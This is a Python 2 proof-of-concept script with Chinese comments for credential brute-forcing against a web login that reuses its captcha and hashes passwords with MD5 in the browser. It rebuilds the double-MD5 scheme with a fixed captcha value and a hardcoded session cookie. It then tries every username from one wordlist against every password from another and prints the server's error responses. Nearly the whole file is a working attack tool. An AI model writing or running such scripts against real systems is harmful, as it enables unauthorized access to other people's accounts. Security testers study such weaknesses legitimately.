#coding=utf-8
#验证码可复用，且md5前端，加密
#    document.getElementById("password").value = MD5(MD5(passwordA.value)+attachCode.value);
#应对此情况进行的poc

#import

from selenium import webdriver
import time
import urllib2
import urllib
import re
import hashlib
import datetime
import pp
# import sys
# reload(sys)
# sys.setdefaultencoding('utf-8')

from bs4 import BeautifulSoup

import json



#参数：
url="host"      #格式： "http://url.com"
attachcode_tag_name="com.cvicse.rbac.attachCode"
# get_referer=
#cookie=getcookie
##获取host
get_host="host"




#并发初始化
from threading import Thread
import Queue
#from queue import Queue
#q是任务队列
#NUM是并发线程总数
#JOBS是有多少任务
q = Queue.Queue(10)
NUM = 4
JOBS = 16
#具体的处理函数，负责处理单个任务
def do_somthing_using(arguments):
    print(arguments)
#这个是工作进程，负责不断从队列取数据并处理
def working():
    while True:
        arguments = q.get() #默认队列为空时，线程暂停
        do_somthing_using(arguments)
        sleep(1)
        q.task_done()



# #模拟登陆
# browser = webdriver.Chrome()
# browser.get(host)   #打开目标页面
# time.sleep(5)



#获取验证码
#document.getElementById("password").value = MD5(MD5(passwordA.value)+attachCode.value);
# import hashlib
# md5加密打印方法：
# m = hashlib.md5()    # 创建md5对象
# m.update('password') #生成加密串，其中 password 是要加密的字符串
# psw = m.hexdigest()  获取加密串
#
def md5_passwd_and_attach(passwd,attach):
    print "[+]opwd:",passwd,
    new_passwd = passwd[0:len(passwd) - 1]
    # print new_passwd
    # print attach
    m=hashlib.md5()
    # print passwd+"-->"
    m.update(new_passwd)
    psw=m.hexdigest()+attach
    # print psw
    # print new_psw+"-->"
    n=hashlib.md5()
    n.update(psw.upper()) #这里md5转大写了，因为业务上遇到的是大写的
    passwd_attach=n.hexdigest()
    # print passwd_attach.upper()
    return passwd_attach.upper()#这里md5转大写了，因为业务上遇到的是大写的



#请求函数：
def send_http_show_response(username,passwd):
    #构造请求头
    header={
    "Host":get_host,"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"zh-CN","Content-Type":"application/x-www-form-urlencoded","Cookie":"JSESSIONID=C4A6A7AF2523DE3D18F70824ECC57130","Connection":"close","Upgrade-Insecure-Requests":"1"
    }
    data={
    "oper":"save","password":passwd,"groupId":"","loginName":username,"passwordA":"","com.cvicse.rbac.attachCode":""
    }
    #请求
    data = urllib.urlencode(data)                                                #编码工作
    req=urllib2.Request(url,headers=header,data=data)
    response=urllib2.urlopen(req)
    the_response_page=response.read()                                            #读取反馈信息  #decode('utf-8')
    text = re.findall("<li class='error'><font color=red>(.*?)</font>",the_response_page,re.S)
    #print type(text) #test
    str_text=''.join(text)                                                       #同样是转字符串，text=str(text)无法将list的['']去掉，而且导致\x2d编码问题
    #print str_text #test
    print username,
    print passwd,
    print str_text
    return;






#读取用户名密码
userfile=open('users.txt')
users=userfile.readlines()
pwdfile=open('password.txt')
pwds=pwdfile.readlines()



#main() 主进程
# username="admin"
# passwd="passwd"
attach="4608"  #验证码
timeout=0    #延时时间
# global sumb
# sumb=0
threads = []
try:
    for username in users:
        for passwd in pwds:
            #开启线程
            # if sumb<NUM:  #控制线程数
                t = Thread(target=send_http_show_response(username,md5_passwd_and_attach(passwd,attach))) #多线程，target后为执行的函数
                threads.append(t)
                time.sleep(timeout)
                # sumb=sumb+1
                # print sumb
                # for item in threads:
                #     item.setDaemon(True)
                #     item.start()
                # for i in range(JOBS):
                #     q.put(i)
                # q.join()
            #
            # elif sumb == NUM:
            #     print "sumb=NUM,right!"
            #     for item in threads:
            #         item.setDaemon(True)
            #         item.start()
            #     #JOBS入队
            #     for i in range(JOBS):
            #         q.put(i)
            #     #等待所有队列为空、再执行别的语句
            #     sumb=0
            #     print "sumb clean, sumb=0."
            #     q.join()
            # else:
            #     print "mulity error！"


except KeyboardInterrupt:
    print('etime:', datetime.datetime.now())
time.sleep(5)
userfile.close()
pwdfile.close()
